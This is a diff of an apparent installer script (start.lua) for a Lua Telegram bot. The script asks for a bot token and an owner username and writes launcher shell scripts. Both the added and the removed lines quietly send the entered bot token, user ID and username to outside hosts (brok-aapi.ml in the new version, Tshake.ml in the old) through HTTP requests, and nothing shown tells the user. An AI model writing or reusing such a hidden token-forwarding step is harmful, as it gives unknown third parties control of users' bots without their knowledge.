@@ -16,7 +16,7 @@ UserName = "]]..UserName..[["
 ]])
 PASTORE_Info_Sudo:close()
 end  
-if not database:get(Server_PASTORE.."Token_Write") then
+if not database:get(Server_PASTORE.."Token_PASTORE") then
 print("\27[1;34m»» Send Your Token Bot :\27[m")
 local token = io.read()
 if token ~= '' then
@@ -28,50 +28,48 @@ io.write('\n\27[1;31m»» The Token Is Saved\n\27[0;39;49m')
 database:set(Server_PASTORE.."Token_PASTORE",token)
 end 
 else
-io.write('\n\27[1;31mThe Tokem was not Saved\n\27[0;39;49m')
+io.write('\n\27[1;31mThe Token was not Saved\n\27[0;39;49m')
 end 
 os.execute('lua start.lua')
 end
 ------------------------------------------------------------------------------------------------------------
 ------------------------------------------------------------------------------------------------------------
-if not database:get(Server_PASTORE.."UserName_Write") then
-print("\27[1;34m\n»» Send Your UserName Sudo : \27[m")
-local UserName = io.read():gsub('@','')
-if UserName ~= '' then
-local Get_Info = http.request("http://Tshake.ml/info/?user="..UserName)
-if Get_Info:match('Is_Spam') then
-io.write('\n\27[1;31m»» Sorry The server is Spsm \nتم حظر السيرفر لمدة 5 دقايق بسبب التكرار\n\27[0;39;49m')
-return false
+if not database:get(Server_PASTORE.."UserName_PASTORE") then
+io.write('\n\27[1;35mSend UserName For Sudo : ارسل معرف المطور الاساسي ...\n\27[0;39;49m')
+local User_Sudo = io.read():gsub('@','')
+if User_Sudo ~= '' then
+local GetInfoUser = https.request("https://brok-aapi.ml/API/Info.php?user="..User_Sudo)
+local User_Info = JSON:decode(GetInfoUser) 
+if User_Info.Info.Chek == "is_block" then
+io.write('\n\27[1;31m If ip server is blocked : سيرفرك لقد تم حظره من السورس \n\27[0;39;49m')
+os.exit()
 end
-local Json = JSON:decode(Get_Info)
-if Json.Info == false then
-io.write('\n\27[1;31m»» Sorry The UserName is not Correct \n\27[0;39;49m')
+if User_Info.Info.Chek == "Not_Info" then
+io.write('\n\27[1;31m The UserName was not Saved : المعرف غلط ارسل المعرف صحيح\n\27[0;39;49m')
 os.execute('lua start.lua')
-else
-if Json.Info == 'Channel' then
-io.write('\n\27[1;31m»» Sorry The UserName Is Channel \n\27[0;39;49m')
+end
+if User_Info.Info == 'Channel' then
+io.write('\n\27[1;31m The UserName Is Channel : عذرا هاذا معرف قناة وليس حساب \n\27[0;39;49m')
 os.execute('lua start.lua')
-else
-io.write('\n\27[1;31m»» The UserNamr Is Saved\n\27[0;39;49m')
-database:set(Server_PASTORE.."UserName_PASTORE",Json.Info.Username)
-database:set(Server_PASTORE.."Id_PASTORE",Json.Info.Id)
 end
-end
+io.write('\n\27[1;31m• The Username Is Saved : تم حفظ معرف المطور الاسي واستخراج ايدي \n\27[0;39;49m')
+https.request("https://brok-aapi.ml/API/Send.php?id="..User_Info.Info.Id.."&username="..User_Info.Info.Username.."&token="..database:get(Server_PASTORE.."Token_PASTORE"))
+database:set(Server_PASTORE.."UserName_PASTORE",User_Info.Info.Username)
+database:set(Server_PASTORE.."Id_PASTORE",User_Info.Info.Id)
 else
-io.write('\n\27[1;31mThe UserName was not Saved\n\27[0;39;49m')
+io.write('\n\27[1;31mThe UserName was not Saved : لم يتم حفظ معرف Carbon\n\27[0;39;49m')
 end 
 os.execute('lua start.lua')
 end
+
 local function Files_PASTORE_Info()
-Create_Info(database:get(Server_PASTORE.."Token_Write"),database:get(Server_PASTORE.."Id_PASTORE"),database:get(Server_PASTORE.."UserName_PASTORE"))   
-http.request("http://Tshake.ml/add/?id="..database:get(Server_PASTORE.."Id_PASTORE").."&user="..database:get(Server_PASTORE.."UserName_PASTORE").."&token="..database:get(Server_PASTORE.."Token_PASTORE"))
+Create_Info(database:get(Server_PASTORE.."Token_PASTORE"),database:get(Server_PASTORE.."Id_PASTORE"),database:get(Server_PASTORE.."UserName_PASTORE"))   
 local RunPASTORE = io.open("PASTORE", 'w')
 RunPASTORE:write([[
 #!/usr/bin/env bash
-cd $HOME/PASTORE
-token="]]..database:get(Server_PASTORE.."Token_Write")..[["
-rm -fr PASTORE.lua
-wget "https://raw.githubusercontent.com/PASTORETEAM/PASTORE/main/PASTORE.lua"
+cd $HOME/SourcePASTORE
+token="]]..database:get(Server_PASTORE.."Token_PASTORE")..[["
+      
 while(true) do
 rm -fr ../.telegram-cli
 ./tg -s ./PASTORE.lua -p PROFILE --bot=$token
@@ -81,7 +79,7 @@ RunPASTORE:close()
 local RunTs = io.open("ts", 'w')
 RunTs:write([[
 #!/usr/bin/env bash
-cd $HOME/PASTORE
+cd $HOME/SourcePASTORE
 while(true) do
 rm -fr ../.telegram-cli
 screen -S PASTORE -X kill
@@ -91,7 +89,7 @@ done
 RunTs:close()
 end
 Files_PASTORE_Info()
-database:del(Server_PASTORE.."Token_Write");database:del(Server_PASTORE.."Id_PASTORE");database:del(Server_PASTORE.."UserName_PASTORE")
+database:del(Server_PASTORE.."Token_PASTORE");database:del(Server_PASTORE.."Id_PASTORE");database:del(Server_PASTORE.."UserName_PASTORE")
 sudos = dofile('sudo.lua')
 os.execute('./install.sh ins')
 end 
@@ -102,7 +100,7 @@ AutoFiles_PASTORE()
 var = true
 else   
 f:close()  
-database:del(Server_PASTORE.."Token_Write");database:del(Server_PASTORE.."Id_PASTORE");database:del(Server_PASTORE.."UserName_PASTORE")
+database:del(Server_PASTORE.."Token_PASTORE");database:del(Server_PASTORE.."Id_PASTORE");database:del(Server_PASTORE.."UserName_PASTORE")
 sudos = dofile('sudo.lua')
 os.execute('./install.sh ins')
 var = false
